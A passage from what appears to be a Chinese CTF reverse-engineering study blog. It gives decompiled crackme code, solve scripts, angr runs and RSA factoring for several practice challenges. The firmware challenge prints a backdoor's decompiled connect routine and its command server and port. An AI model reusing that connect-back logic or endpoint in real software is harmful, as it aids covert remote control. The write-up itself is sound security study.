[rsp+4h] [rbp-23Ch] __int64 input[4]; // [rsp+10h] [rbp-230h] BYREF char v5[520]; // [rsp+30h] [rbp-210h] BYREF unsigned __int64 v6; // [rsp+238h] [rbp-8h] v6 = __readfsqword(0x28u); memset(v5, 0, 0x200uLL); input[0] = 0LL; input[1] = 0LL; input[2] = 0LL; input[3] = 0LL; if ( (unsigned int)sub_4008B9((__int64)v5) == -1 ) exit(0LL); read(0LL, input, 19LL); qword_602048 = (__int64)sub_400A69; mprotect((unsigned int)main \u0026amp; 0xFFFFC000, 16LL, 7LL); for ( i = 0; i \u0026lt;= 9; ++i ) *(_BYTE *)(qword_602048 + i) ^= *((_BYTE *)input + i % 5); if ( (unsigned int)sub_400A69((__int64)v5, (__int64)input + 5) ) write(1LL, \u0026quot;Cong!\\n\u0026quot;, 6LL); exit(0LL); } 现在只需求出main函数里的v5即sub_400A69里的a1，即可解出flag\nsub_4008B9里面实现太复杂了，想法是动调得到v5，但这里面有ptrace反调试\n又因为反调试在输入之前，所以可以先运行到输出，然后再attach上去\n这里我做的时候只有root用户运行可以，普通用户会报错权限不足什么的，具体原因不清楚\nattach上之后main函数点进去v5，可以看到需要的前14位就是Linux Version 最后写脚本解flag\n#include\u0026lt;stdio.h\u0026gt; char en_flag[]={53,45,17,26,73,125,17,20,'+',';','\u0026gt;','=','\u0026lt;','_'}; char v5[]=\u0026quot;Linux Version \u0026quot;; char flag[100]; int main(){ for(int i=0;i\u0026lt;=13;i++){ flag[i]=(v5[i]+2)^en_flag[i]; } puts(flag); } // {Fam3_Is_NULL} 0x02 XNUCA 2020 Unravel MFC 没有最难，只有更难，这周已经做得心态爆炸了（（\n开始连有用的函数都找不到，官方wp写得也有亿点简略，搞了几个小时也进展不大\n先放放吧，后面再填坑\n第七周 0×00 GUETCTF 2019 number game 拒 绝 暴 力\ndie查，Elf64，进ida\nmain函数东西有点多，一个一个看\nunsigned __int64 __fastcall main(int a1, char **a2, char **a3) { _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] __int64 v7; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); v5 = 0LL; v6 = 0; v7 = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(\u0026quot;%s\u0026quot;, \u0026amp;v5); if ( (unsigned int)sub_4006D6((const char *)\u0026amp;v5) ) { v4 = sub_400758((__int64)\u0026amp;v5, 0, 10u); sub_400807((__int64)v4, (__int64)\u0026amp;v7); v9 = 0; sub_400881(\u0026amp;v7); if ( (unsigned int)sub_400917() ) { puts(\u0026quot;TQL!\u0026quot;); printf(\u0026quot;flag{\u0026quot;); printf(\u0026quot;%s\u0026quot;, (const char *)\u0026amp;v5); puts(\u0026quot;}\u0026quot;); } else { puts(\u0026quot;your are cxk!!\u0026quot;); //cai xu kun??? } } return __readfsqword(0x28u) ^ v10; } sub_4006D6（）判断输入是否为数字0-4，且共10位\n剩下几个函数可以倒着看\n第二个if里面sub_4006D6（）的判断是一个5*5的数独逻辑\n1 4 # 2 3 3 0 # 1 # 0 # 2 3 # # 3 # # 0 4 2 # # 1 手动填一下是0421421430\nsub_400881(\u0026amp;v7)就是用上面的值填数独待检验\nsub_400807（）应该只是复制了一下，v4-\u0026gt;v7，动调验证确实啥也没干\n主要加密函数是sub_400758（）\n_QWORD *__fastcall sub_400758(__int64 a1, int a2, unsigned int a3) { char v5; // [rsp+1Fh] [rbp-11h] _QWORD *v6; // [rsp+28h] [rbp-8h] v5 = *(_BYTE *)(a2 + a1); if ( v5 == ' ' || v5 == '\\n' || a2 \u0026gt;= (int)a3 ) return 0LL; v6 = malloc(24uLL); *(_BYTE *)v6 = v5; v6[1] = sub_400758(a1, 2 * a2 + 1, a3); v6[2] = sub_400758(a1, 2 * (a2 + 1), a3); return v6; } 递归，2 * a2 + 1，2 * (a2 + 1)，第一感觉是二叉树访问左右子树，没点OI基础都做不了逆向（（\n动调验证一下，实际是通过对input按数组下标建立二叉树，然后输出中序遍历\n于是可以根据0421421430手动建树，这里因为默认二叉树从左到右生长，所以保证了答案的唯一性\n1 1 3 4 2 4 0 0 2 4 //flag：1134240024 0x01 HITCTF 2020 Node 没想法，没思路，verify函数上千行代码劝退（（\n只能拜读RX的wp\n原来只要找到345行一逆就行while ( (char)(*((_BYTE *)v124 + v37) ^ 'r') + 'h' == key[v37] )\n#include\u0026lt;stdio.h\u0026gt; unsigned char key[] = { 0x93, 0x85, 0x69, 0x82, 0x83, 0x84, 0x85, 0xC7, 0x69, 0xBA, 0x6D, 0x7B, 0x84, 0x6E, 0xBA, 0x7B, 0xBA, 0x7D, 0x83, 0x68, 0x86, 0x7C, 0x68, 0x83, 0x7F, 0x84, 0x7E, 0xC6, 0x6D, 0x6F, 0x6D, 0x6F }; char flag[100]; int main(){ for(int i=0;i\u0026lt;32;i++){ flag[i]=(key[i]-'h')^'r'; } puts(flag); } //Yoshino-s want a girlfriend,wuwu 难点在于根本找不到\n根据bb的wp获得思路，既然逆出来的东西要用来做web，那么一定在export窗口能找到\n打开export窗口很显眼地就能看到key\n查交叉引用就能找到verify函数，就能定位345行，问题解决，又长见识了\n0×02 GKCTF 2020 BabyDriver die查，PE64，进ida\n翻string窗口看到了\n.data:0000000140003000 000000E1 C ****************o.*..*......*..**.**...**.*.*.***.****.**.*.*.***.......*.*.*****..***..*..**..***....**....**....***..**.***.***....**...***.**********..***......#****.*****************************\n打开果然是个地图，共225byte\n刚开始还以为是15*5，后面看代码觉得不对，最后确定是14*16\n**************** o.*..*......*..* *.**...**.*.*.** *.****.**.*.*.** *...**....*.*.** ***..***.**.*..* *.**.***.**.**.* *.**.******.**.* *.**....***.**.* *.*****.***....* *...***.******** **..***......#** **.************* **************** 根据地图查交叉引用定位走地图逻辑函数\n__int64 __fastcall sub_140001380(__int64 a1, __int64 a2) { __int64 v3; // rdi __int64 v4; // rax int v5; // ecx __int16 *v6; // rsi __int64 v7; // rbp __int16 v8; // dx char v9; // dl const CHAR *v10; // rcx if ( *(int *)(a2 + 48) \u0026gt;= 0 ) { v3 = *(_QWORD *)(a2 + 24); v4 = *(_QWORD *)(a2 + 56) \u0026gt;\u0026gt; 3; if ( (_DWORD)v4 ) { v5 = dword_1400030E4; v6 = (__int16 *)(v3 + 2); v7 = (unsigned int)v4; while ( *(_WORD *)(v3 + 4) ) { LABEL_28: v6 += 6; if ( !--v7 ) goto LABEL_29; } byte_140003000[v5] = 46; v8 = *v6; if ( *v6 == 0x17 ) { if ( (v5 \u0026amp; 0xFFFFFFF0) != 0 ) { v5 -= 16; goto LABEL_21; } v5 += 208; dword_1400030E4 = v5; } if ( v8 == 0x25 ) { if ( (v5 \u0026amp; 0xFFFFFFF0) != 208 ) { v5 += 16; goto LABEL_21; } v5 -= 208; dword_1400030E4 = v5; } if ( v8 == 0x24 ) { if ( (v5 \u0026amp; 0xF) != 0 ) { --v5; goto LABEL_21; } v5 += 15; dword_1400030E4 = v5; } if ( v8 != 0x26 ) goto LABEL_22; if ( (v5 \u0026amp; 0xF) == 15 ) v5 -= 15; else ++v5; LABEL_21: dword_1400030E4 = v5; LABEL_22: v9 = byte_140003000[v5]; if ( v9 == 42 ) { v10 = \u0026quot;failed!\\n\u0026quot;; } else { if ( v9 != 35 ) { LABEL_27: byte_140003000[v5] = 111; goto LABEL_28; } v10 = \u0026quot;success! flag is flag{md5(input)}\\n\u0026quot;; } dword_1400030E4 = 16; DbgPrint(v10); v5 = dword_1400030E4; goto LABEL_27; } } LABEL_29: if ( *(_BYTE *)(a2 + 65) ) *(_BYTE *)(*(_QWORD *)(a2 + 184) + 3i64) |= 1u; return *(unsigned int *)(a2 + 48); } 上下左右逻辑容易看出来，但值0x17,0x25什么的太奇怪了\n偷看师傅们的wp知道了原来是键盘扫描码，粘个链接\n0x17-i-up 0x24-j-left 0x25-k-down 0x26-l-right 手动走一下：lkkkllklkkklllkkklllll\n结果不对？？好吧得全大写再求md5\n最终flag：flag{403950a6f64f7fc4b655dea696997851}\n第六周 0×00 PyDis 附件是pyc，先想到uncompyle6\nC:\\Users\\DX3906\\Desktop\\t1\u0026gt;uncompyle6 pyre.cpython-39.pyc\u0026gt;2.py # Unsupported bytecode in file pyre.cpython-39.pyc # Unsupported Python version, 3.9.0, for decompilation 3.9不支持，痛苦开始\nimport dis,marshal f=open(\u0026quot;pyre.cpython-39.pyc\u0026quot;,\u0026quot;rb\u0026quot;).read() code = marshal.loads(f[16:]) dis.dis(code) 先抄含树师傅的代码得字节码\n1 0 BUILD_LIST 0 2 LOAD_CONST 0 ((178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163)) 4 LIST_EXTEND 1 6 STORE_NAME 0 (magic) 2 8 LOAD_NAME 1 (input) 10 LOAD_CONST 1 ('flag \u0026gt;\u0026gt;\u0026gt; ') 12 CALL_FUNCTION 1 14 STORE_NAME 2 (inp) 4 16 LOAD_NAME 3 (list) 18 LOAD_NAME 2 (inp) 20 CALL_FUNCTION 1 22 STORE_NAME 4 (flag) 5 24 LOAD_NAME 5 (len) 26 LOAD_NAME 4 (flag) 28 CALL_FUNCTION 1 30 LOAD_NAME 5 (len) 32 LOAD_NAME 0 (magic) 34 CALL_FUNCTION 1 36 COMPARE_OP 3 (!=) 38 POP_JUMP_IF_FALSE 54 6 40 LOAD_NAME 6 (print) 42 LOAD_CONST 2 ('qwq') 44 CALL_FUNCTION 1 46 POP_TOP 7 48 LOAD_NAME 7 (exit) 50 CALL_FUNCTION 0 52 POP_TOP 9 \u0026gt;\u0026gt; 54 LOAD_NAME 8 (range) 56 LOAD_NAME 5 (len) 58 LOAD_NAME 4 (flag) 60 CALL_FUNCTION 1 62 LOAD_CONST 3 (2) 64 BINARY_FLOOR_DIVIDE 66 CALL_FUNCTION 1 68 GET_ITER \u0026gt;\u0026gt; 70 FOR_ITER 54 (to 126) 72 STORE_NAME 9 (i) 10 74 LOAD_NAME 4 (flag) 76 LOAD_CONST 3 (2) 78 LOAD_NAME 9 (i) 80 BINARY_MULTIPLY 82 LOAD_CONST 4 (1) 84 BINARY_ADD 86 BINARY_SUBSCR 88 LOAD_NAME 4 (flag) 90 LOAD_CONST 3 (2) 92 LOAD_NAME 9 (i) 94 BINARY_MULTIPLY 96 BINARY_SUBSCR 98 ROT_TWO 100 LOAD_NAME 4 (flag) 102 LOAD_CONST 3 (2) 104 LOAD_NAME 9 (i) 106 BINARY_MULTIPLY 108 STORE_SUBSCR 110 LOAD_NAME 4 (flag) 112 LOAD_CONST 3 (2) 114 LOAD_NAME 9 (i) 116 BINARY_MULTIPLY 118 LOAD_CONST 4 (1) 120 BINARY_ADD 122 STORE_SUBSCR 124 JUMP_ABSOLUTE 70 12 \u0026gt;\u0026gt; 126 BUILD_LIST 0 128 STORE_NAME 10 (check) 14 130 LOAD_NAME 8 (range) 132 LOAD_NAME 5 (len) 134 LOAD_NAME 4 (flag) 136 CALL_FUNCTION 1 138 CALL_FUNCTION 1 140 GET_ITER \u0026gt;\u0026gt; 142 FOR_ITER 26 (to 170) 144 STORE_NAME 9 (i) 15 146 LOAD_NAME 10 (check) 148 LOAD_METHOD 11 (append) 150 LOAD_NAME 12 (ord) 152 LOAD_NAME 4 (flag) 154 LOAD_NAME 9 (i) 156 BINARY_SUBSCR 158 CALL_FUNCTION 1 160 LOAD_CONST 5 (222) 162 BINARY_XOR 164 CALL_METHOD 1 166 POP_TOP 168 JUMP_ABSOLUTE 142 17 \u0026gt;\u0026gt; 170 LOAD_NAME 8 (range) 172 LOAD_NAME 5 (len) 174 LOAD_NAME 0 (magic) 176 CALL_FUNCTION 1 178 CALL_FUNCTION 1 180 GET_ITER \u0026gt;\u0026gt; 182 FOR_ITER 34 (to 218) 184 STORE_NAME 9 (i) 18 186 LOAD_NAME 10 (check) 188 LOAD_NAME 9 (i) 190 BINARY_SUBSCR 192 LOAD_NAME 0 (magic) 194 LOAD_NAME 9 (i) 196 BINARY_SUBSCR 198 COMPARE_OP 3 (!=) 200 POP_JUMP_IF_FALSE 182 19 202 LOAD_NAME 6 (print) 204 LOAD_CONST 2 ('qwq') 206 CALL_FUNCTION 1 208 POP_TOP 20 210 LOAD_NAME 7 (exit) 212 CALL_FUNCTION 0 214 POP_TOP 216 JUMP_ABSOLUTE 182 22 \u0026gt;\u0026gt; 218 LOAD_NAME 6 (print) 220 LOAD_CONST 6 ('happy new year!') 222 CALL_FUNCTION 1 224 POP_TOP 226 LOAD_CONST 7 (None) 228 RETURN_VALUE 参考：死磕字节码 python官方文档 分析逻辑\n大概是这个意思（还是习惯写c\n#include\u0026lt;stdio.h\u0026gt; char magic[]={178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163}; char flag[100]; int main(){ scanf(\u0026quot;%s\u0026quot;,flag); for(int i=0;i\u0026lt;8;i++){ char x=flag[2*i]; flag[2*i]=flag[2*i+1]; flag[2*i+1]=x; } for(int i=0;i\u0026lt;17;i++){ flag[i]^=222; if(flag[i]!=magic[i]){ puts(\u0026quot;wrong\u0026quot;); return 0; } } puts(\u0026quot;write\u0026quot;); } 写脚本解密\n#include\u0026lt;stdio.h\u0026gt; char en_flag[]={178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163}; int main(){ for(int i=0;i\u0026lt;17;i++){ en_flag[i]^=222; } for(int i=0;i\u0026lt;8;i++){ char x=en_flag[2*i]; en_flag[2*i]=en_flag[2*i+1]; en_flag[2*i+1]=x; } puts(en_flag); } //flag{hapi_new_ya} 0×01 FlareOn4 IgniteMe die查，无壳，PE32，进ida\n主函数长这样\nvoid __noreturn start() { DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, \u0026amp;NumberOfBytesWritten, 0); sub_4010F0(NumberOfBytesWritten); if ( sub_401050() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, \u0026amp;NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, \u0026amp;NumberOfBytesWritten, 0); ExitProcess(0); } sub_4010F0()这个函数好像什么也没干\n主要加密在sub_401050()\nint sub_401050() { int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = sub_401020(byte_403078); v4 = sub_401000(); for ( i = v1 - 1; i \u0026gt;= 0; --i ) { byte_403180[i] = v4 ^ byte_403078[i]; v4 = byte_403078[i]; } for ( j = 0; j \u0026lt; 0x27; ++j ) { if ( byte_403180[j] != (unsigned __int8)byte_403000[j] ) return 0; } return 1; } 看一下里面代码能猜出来sub_401020()就是strlen()\nv4直接动调就是0x4\n写脚本解密\n#include\u0026lt;stdio.h\u0026gt; char en_flag[]={13, 38,73, 69, 42, 23, 120, 68, 43, 108,93, 94, 69, 18, 47, 23, 43, 68, 111, 110,86, 9, 95, 69, 71, 115, 38, 10, 13, 19,23, 72, 66, 1, 64, 77, 12, 2, 105,0}; char flag[1000]; int main(){ char V4=4; for(int i=39;i\u0026gt;=0;i--){ flag[i]=en_flag[i]^V4; V4=flag[i]; } puts(flag); } //flag;{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com} 0x02 BUUCTF Firmware 这题难点在于工具的安装（（\n跟着含树师傅的wp走\nwindows比较麻烦，直接开虚拟机先装binwalk,觉得慢可以换个源\ngit clone https://github.com/devttys0/binwalk cd binwalk python setup.py install 先binwalk -e 拆包，四个文件，挨个file命令查看\n有用的就是120200.squashfs，这里要用 firmware-mod-kit 的 unsquashfs_all.sh工具\n然后就遇到了和bb师傅一样的问题，持续痛苦面具\n幸好RX神是万能的\n发现问题是github仓库的源代码有问题\n换一个仓库一切正常了\ngit clone https://github.com/rampageX/firmware-mod-kit.git cd firmware-mod-kit/src ./configure make 利用uncramfs_all.sh拆120200.squashfs\n发现/tmp里有个backdoor文件，这也太明显了，不过要是藏起来可能还真找不着\n拖ida分析\n先看string窗口直接就看到了 echo.byethost51.com\n盲猜就是题目要的服务器地址，点进去看到变量名commServer，确信\n查交叉引用找到了ininConnextion()函数\nbool initConnection() { char *v0; // r0 char s[512]; // [sp+4h] [bp-208h] BYREF int v3; // [sp+204h] [bp-8h] memset(s, 0, sizeof(s)); if ( mainCommSock ) { close(mainCommSock); mainCommSock = 0; } if ( currentServer ) ++currentServer; else currentServer = 0; strcpy(s, (\u0026amp;commServer)[currentServer]); v3 = 36667; if ( strchr(s, 58) ) { v0 = strchr(s, 58); v3 = atoi(v0 + 1); *strchr(s, 58) = 0; } mainCommSock = socket(2, 1, 0); return connectTimeout(mainCommSock, s, v3, 30) == 0; } 盲猜端口号就是v3=36667，实在太像了\n于是flag{MD5(echo.byethost51.com:36667)}=flag{33a422c45d551ac6e4756f59812a954b}\ncorrect！\n第五周 2021-11-29 补上周，虽迟但到\n0x00 DDCTF Android Easy 下载附件是个zip\n后缀改为apk用jeb打开\n打开FlagActivity文件看java\n甚至都不用算(( flag{DDCTF-3ad60811d87c4a2dba0ef651b2d93476@didichuxing.com}\n0x01 WELCOME TO JNI 【维基百科】 JNI （Java Native Interface，Java本地接口）是一种编程框架，使得Java虚拟机中的Java程序可以调用本地应用/或库，也可以被其他程序调用。 本地程序一般是用其它语言（C、C++或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序。 下载附件是apk，直接进jeb，打开MainActivity\npublic class MainActivity extends AppCompatActivity { static { System.loadLibrary(\u0026quot;native-lib\u0026quot;); } public native boolean loginUtils(String arg1) { } @Override // androidx.appcompat.app.AppCompatActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main this.findViewById(0x7F080057).setOnClickListener(new View.OnClickListener() { // id:button @Override // android.view.View$OnClickListener public void onClick(View v) { boolean ok = MainActivity.this.loginUtils(((EditText)MainActivity.this.findViewById(0x7F0800B5)).getText().toString()); // id:inputBox Toast.makeText(MainActivity.this.getApplicationContext(), ok ? \u0026quot;RIGHT!!!!\u0026quot; : \u0026quot;WRONG!!!!\u0026quot;, 1).show(); } }); } } 经含树师傅指点得知stem.loadLibrary(\u0026quot;native-lib\u0026quot;);就是JNI的标志\n把附件后缀改为zip，打开lib文件夹，里面即native-lib\n四个文件夹内容基本一样，只是架构不同\n随便拖一个进ida（一定要先解压。。。）\n查string就能看到flag{welcome_to_naive_lib!}\n0x02 Codegate CTF Redvelvet die查，elf64，进ida，函数列表找main\nv40 = __readfsqword(40u); strcpy(s2, \u0026quot;0a435f46288bb5a764d13fca6c901d3750cee73fd7689ce79ef6dc0ff8f380e5\u0026quot;); v36 = 0LL; v37 = 0LL; v38 = 0LL; v39 = 0; printf(\u0026quot;Your flag : \u0026quot;); fgets(\u0026amp;s, 27, edata); func1(s, v8); func2((unsigned int)v8, (unsigned int)v9); func3((unsigned int)v9, (unsigned int)v10); func4((unsigned int)v10, (unsigned int)v11); func5((unsigned int)v11, (unsigned int)v12); func6((unsigned int)v12, (unsigned int)v13, (unsigned int)v14); func7((unsigned int)v14, (unsigned int)v15, (unsigned int)v16); func8((unsigned int)v16, (unsigned int)v17, (unsigned int)v18); func9((unsigned int)v18, (unsigned int)v19, (unsigned int)v20); func10((unsigned int)v20, (unsigned int)v21, (unsigned int)v22); func11((unsigned int)v22, (unsigned int)v23, (unsigned int)v24); func12((unsigned int)v24, (unsigned int)v25, (unsigned int)v26); func13((unsigned int)v26, (unsigned int)v27, (unsigned int)v28); func14((unsigned int)v28, (unsigned int)v29, (unsigned int)v30); func15((unsigned int)v30, (unsigned int)v31, (unsigned int)v32); SHA256_Init((__int64)v6); v3 = strlen(\u0026amp;s); SHA256_Update(v6, \u0026amp;s, v3); SHA256_Final(v33, v6); for ( i = 0; i \u0026lt;= 31; ++i ) sprintf(\u0026amp;s1[2 * i], \u0026quot;%02x\u0026quot;, (unsigned __int8)v33[i]); if ( strcmp(s1, s2) ) exit(1); printf(\u0026quot;flag : {\\\u0026quot; %s \\\u0026quot;}\\n\u0026quot;, \u0026amp;s); return 0; 基本逻辑是对输入走15个function，然后SHA256加密和s2比较\n直接上angr\n但这里需要注意，SHA256不可逆，所以find直接设在cmp处angr算不出来\n而从SHA256之前到cmp只有一条路，所以find设在加密之前就行了,而avoid设在exit()函数处就行\nIn [1]: import angr In [2]: proj = angr.Project('./RedVelvet',auto_load_libs=False) In [3]: state = proj.factory.entry_state() In [4]: simgr = proj.factory.simgr(state) In [5]: simgr.explore(find=0x401537,avoid=0x4007D0) 提示Out[5]: \u0026lt;SimulationManager with 1 found, 63 avoid\u0026gt;\n输出\nIn [6]: print(simgr.found[0].posix.dumps(0)) b'What_You_Wanna_Be?:)_la_la' 这里说明一下，上面的是正确答案\n但其实我第一次跑出来是b'What_You_Wanna_Be?:)_lc_la,差了一个字母\n当我写这篇wp时又跑了一遍，答案却是对的\n两次脚本完全一样，angr也都没提示多解，但输出却不同\n这才印证了RX师傅所说，粘几张聊天记录 用我的话来说就是：\n1.angr对于已经走通的路不会再走第二遍\n2.每一次先走哪条路（得到哪个答案）是随机的\n所以出问题时（angr计算不准确）大可以多来两遍（\n第四周 2021-11-20\n0x00 DMCTF2020 re3 一种常见的算法。\ndie查，ELF64，进ida\n结合tips使用Findcrypt插件\n函数列表定位main函数\n__int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax int i; // [rsp+1Ch] [rbp-C4h] char v6[96]; // [rsp+20h] [rbp-C0h] BYREF char v7[16]; // [rsp+80h] [rbp-60h] BYREF char s[32]; // [rsp+90h] [rbp-50h] BYREF char s1[40]; // [rsp+B0h] [rbp-30h] BYREF unsigned __int64 v10; // [rsp+D8h] [rbp-8h] v10 = __readfsqword(0x28u); puts(::s); memset(s, 0, 0x14uLL); read(0, s, 5uLL); sub_90A(v6); v3 = strlen(s); sub_956(v6, s, v3); sub_AA4(v6, v7); for ( i = 0; i \u0026lt;= 15; ++i ) sprintf(\u0026amp;s1[2 * i], \u0026quot;%02x\u0026quot;, (unsigned __int8)v7[i]); if ( !strcmp(s1, Big_Numbers1_203060) ) printf(\u0026quot;right\u0026quot;); getchar(); return 0LL; } Findcrypt结果\n.data:0000000000203060 global Big_Numbers1_203060 $c0 b'21232f297a57a5a743894a0e4a801fc3' 难道有种算法叫bignumbers？\n百度无果，于是尝试搞懂加密逻辑，手动逆（天真.jpg)\n然后就没有然后了（\n偷看师傅们的题解,原来bignumbers是MD5的密文？？？\n网站撞出flag{admin}\n0x01 ACTF2020 Oruga 又是熟悉的迷宫……等下这是什么东西？ die查，Elf64，进ida\n迷宫逻辑函数\n_BOOL8 __fastcall sub_78A(__int64 a1) { int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int v4; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; v4 = 0; while ( byte_201020[v2] != 33 ) { v2 -= v4; if ( *(_BYTE *)(v3 + a1) != 'W' || v4 == -16 ) { if ( *(_BYTE *)(v3 + a1) != 'E' || v4 == 1 ) { if ( *(_BYTE *)(v3 + a1) != 'M' || v4 == 16 ) { if ( *(_BYTE *)(v3 + a1) != 'J' || v4 == -1 ) return 0LL; v4 = -1; } else { v4 = 16; } } else { v4 = 1; } } else { v4 = -16; } ++v3; while ( !byte_201020[v2] ) { if ( v4 == -1 \u0026amp;\u0026amp; (v2 \u0026amp; 0xF) == 0 ) return 0LL; if ( v4 == 1 \u0026amp;\u0026amp; v2 % 16 == 15 ) return 0LL; if ( v4 == 16 \u0026amp;\u0026amp; (unsigned int)(v2 - 240) \u0026lt;= 0xF ) return 0LL; if ( v4 == -16 \u0026amp;\u0026amp; (unsigned int)(v2 + 15) \u0026lt;= 0x1E ) return 0LL; v2 += v4; } } return *(_BYTE *)(v3 + a1) == 125; } 可以看出byte_201020是地图，共256byte，即16*16的地图\nv2是当前所在的位置，v4是偏移量，1-right，-1-left，16-down，-16-up\n上面的while里四个if可以直接对应else给v4赋值，即W-up E-right M-down J-left\n下面的while函数里四个if应该是边界判断\n然后循环一直往一个方向走，直到碰到字符\n知道了这些，才能搞懂上面四个if里||v4==xx这个条件是在干啥\n可以发现这个条件和下面else里给v4的赋值是一样的\n即如果下一步和上一步是一样的，但上一步已经走到了这个方向所能走的最远处，这一步就是无效的\n如果出现无效的重复命令，if判断会一路畅通，直接return 0\n至此，手动走地图得flag：actf{MEWEMEWJMEWJM} 0×02 网鼎杯2020 signal 尝试一下某个自动化逆向工具？\n感谢RX细心又耐心讲解符号执行\nangr直接搞他\nproject = angr.Project('./signal.exe',auto_load_libs = False) state = project.factory.entry_state() simgr = project.factory.simgr(state) simgr.explore(find = 0x40179E,avoid =0x401539) print(simgr.found[0].posix.dumps(0)) 得flag{757515121f3d478}，真香\n第三周 2021-11-13\n0×00 SUCTF2019 Signin 你认识这个算法嘛\n不认识，然后根据题解先去学RSA和gmpy2库，断断续续学了几天（（\n贴个链接吧，便于以后复习\nRSA gmpy2库常见函数\ndie查壳，无，然后进ida，直接根据函数列表定位main函数\n__int64 __fastcall main(int a1, char **a2, char **a3) { char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char v7[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\u0026quot;[sign in]\u0026quot;); printf(\u0026quot;[input your flag]: \u0026quot;); __isoc99_scanf(\u0026quot;%99s\u0026quot;, v8); sub_96A(v8, v9); __gmpz_init_set_str(v7, \u0026quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\u0026quot;, 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, \u0026quot;103461035900816914121390101299049044413950405173712170434161686539878160984549\u0026quot;, 10LL); __gmpz_init_set_str(v5, \u0026quot;65537\u0026quot;, 10LL); __gmpz_powm(v6, v6, v5, v4); if ( (unsigned int)__gmpz_cmp(v6, v7) ) puts(\u0026quot;GG!\u0026quot;); else puts(\u0026quot;TTTTTTTTTTql!\u0026quot;); return 0LL; } 根据RSA的形式稍微重命名一下变量\nv10 = __readfsqword(0x28u); puts(\u0026quot;[sign in]\u0026quot;); printf(\u0026quot;[input your flag]: \u0026quot;); __isoc99_scanf(\u0026quot;%99s\u0026quot;, input); sub_96A(input, v9); __gmpz_init_set_str(c, \u0026quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\u0026quot;, 16LL); __gmpz_init_set_str(calc, v9, 16LL); __gmpz_init_set_str(n, \u0026quot;103461035900816914121390101299049044413950405173712170434161686539878160984549\u0026quot;, 10LL); __gmpz_init_set_str(e, \u0026quot;65537\u0026quot;, 10LL); __gmpz_powm(calc, calc, e, n); if ( (unsigned int)__gmpz_cmp(calc, c) ) // calc是根据input计算出的密文，c是实际的密文 puts(\u0026quot;GG!\u0026quot;); else puts(\u0026quot;TTTTTTTTTTql!\u0026quot;); return 0LL; 先用yafu分解n，由于写这篇文章时是第二次分解n所以比较快\nC:\\Users\\DX3906\u0026gt;D:\\reserve\\yafu\\yafu-x64.exe factor(103461035900816914121390101299049044413950405173712170434161686539878160984549) fac: factoring 103461035900816914121390101299049044413950405173712170434161686539878160984549 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits starting SIQS on c78: 103461035900816914121390101299049044413950405173712170434161686539878160984549 ==== sieving in progress (1 thread): 36224 relations needed ==== ==== Press ctrl-c to abort and save state ==== SIQS elapsed time = 1.0985 seconds. Total factoring time = 1.1195 seconds ***factors found*** P39 = 282164587459512124844245113950593348271 P39 = 366669102002966856876605669837014229419 ans = 1 得到 p=282164587459512124844245113950593348271 q=366669102002966856876605669837014229419\n已知n,p,q,e，先求d\nimport gmpy2 n=103461035900816914121390101299049044413950405173712170434161686539878160984549 p=282164587459512124844245113950593348271 q=366669102002966856876605669837014229419 e=65537 l=(p-1)*(q-1) d=gmpy2.invert(e,l) 已知n,d,c,求明文\nc=0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 flag=gmpy2.powmod(c,d,n) from Crypto.Util.number import * print(long_to_bytes(flag)) # b'suctf{Pwn_@_hundred_years}' 0×01 FlareOn6 Overlang die查看文件信息，PE32，拖进ida\n竟然就三个函数，start函数应该是主要的\nint __stdcall start(int a1, int a2, int a3, int a4) { CHAR Text[128]; // [esp+0h] [ebp-84h] BYREF int v6; // [esp+80h] [ebp-4h] v6 = sub_401160(Text, \u0026amp;unk_402008, 28); Text[v6] = 0; MessageBoxA(0, Text, Caption, 0); return 0; } sub_401160函数像是把unk_402008的前28位复制给Text，然后通过MessageBoxA输出Text和Caption\n这里我们可以打开unk_402008看看\n.rdata:00402008 unk_402008 db 0E0h ; DATA XREF: start+B↑o .rdata:00402009 db 81h .rdata:0040200A db 89h .rdata:0040200B db 0C0h .rdata:0040200C db 0A0h .rdata:0040200D db 0C1h .rdata:0040200E db 0AEh .rdata:0040200F db 0E0h .rdata:00402010 db 81h .rdata:00402011 db 0A5h .rdata:00402012 db 0C1h .rdata:00402013 db 